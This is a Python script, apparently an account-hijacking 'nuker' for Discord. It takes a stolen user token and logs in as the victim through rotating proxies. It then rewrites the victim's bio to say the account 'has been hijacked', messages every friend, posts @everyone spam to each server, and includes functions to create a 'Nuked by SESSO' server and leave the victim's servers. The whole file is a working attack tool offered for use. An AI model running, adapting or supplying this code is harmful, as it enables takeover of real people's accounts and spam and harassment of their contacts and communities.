
import requests
import discord
import time
import json
import os
import threading
import random
import proxygen
from itertools import cycle
import asyncio

with open("vietzi.jpg", "r") as vietzi:
    sesso_logo = vietzi



checkweb = False
proxies = proxygen.get_proxies()
proxy_pool = cycle(proxies)

Token = input("Insert the token to fuck > ")
headers = {"authorization": Token, "user-agent": "Sesso"}

victim = discord.Client()

friend_remove = []


def update_bio():
    try:
        r = requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json={"bio": "This account has been hijacked by【𝙎.𝙀.𝙎.𝙎.𝙊】\n\nhttps://www.youtube.com/watch?v=NPk67R55dYo&lc=Ugych8hoCE5dfISas894AaABAg"},  proxies={"http": next(proxy_pool)})
        if r.status_code in [200, 201, 204]:
            print("Updated Bio")
        if r.status_code == 429:
            f = r.json()
            time.sleep(f['retry_after'])
    except:
        pass


def delete_guilds(id):
    try:
        r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{id}", headers=headers, proxies={"http": next(proxy_pool)})
        if r.status_code in [200, 201, 204]:
            print("Deleted guild")
        if r.status_code == 429:
            f = r.json()
            time.sleep(f['retry_after'])
    except:
        pass

def make_guild():
    try:
        r = requests.post(f"https://discord.com/api/v9/guilds", headers=headers, json={"name": "Nuked by SESSO", "icon": sesso_logo}, proxies={"http": next(proxy_pool)})
        if r.status_code in [200, 201, 204]:
            print("Created guild")
        if r.status_code == 429:
            f = r.json()
            time.sleep(f['retry_after'])
    except:
        pass


async def uwu(user):
    try:
        try:
            r = requests.post(f"https://discord.com/api/v9/users/@me/channels", json={"recipients": str(user.id)}, headers=headers, proxies={"http": next(proxy_pool)})
            jsonn = r.json()
            if r.status_code == 429:
                time.sleep(jsonn['retry_after'])
                sussy = jsonn['id']
        except:
            pass
        await user.send("> This account has been hijacked by【𝙎.𝙀.𝙎.𝙎.𝙊】\n\nhttps://www.youtube.com/watch?v=NPk67R55dYo&lc=Ugych8hoCE5dfISas894AaABAg\n\n**Praise LEONDEV**")
        print(f"Messaged {user.name}")
        try:
            r2 = requests.delete(f"https://discord.com/api/v9/channels/{sussy}", headers=headers, proxies={"http": next(proxy_pool)})
            a = r.json()
            if r2.status_code == 429:
                time.sleep(a['retry_after'])
        except:
            pass
    except:
        print(f"Could not message {user.name}")



@victim.event
async def on_ready():
    tasks = []
    update_bio()
    for user in victim.user.friends:
        try:
            tasks.append(await uwu(user))
        except:
            pass
    try:
        await asyncio.gather(*tasks)
    except:
        pass 
    for server in victim.guilds:
        try:
            await random.choice(server.channels).send("@everyone This account has been hijacked by【𝙎.𝙀.𝙎.𝙎.𝙊】\n\nhttps://www.youtube.com/watch?v=NPk67R55dYo&lc=Ugych8hoCE5dfISas894AaABAg")
        except:
            pass
    # This is for scraping
    #try:
        #for server in victim.guilds:
            #delete_guilds(server)
    #except:
        #pass

try:
    victim.run(Token, bot=False)
except:
    os.system("cls")
    input("Invalid token!")
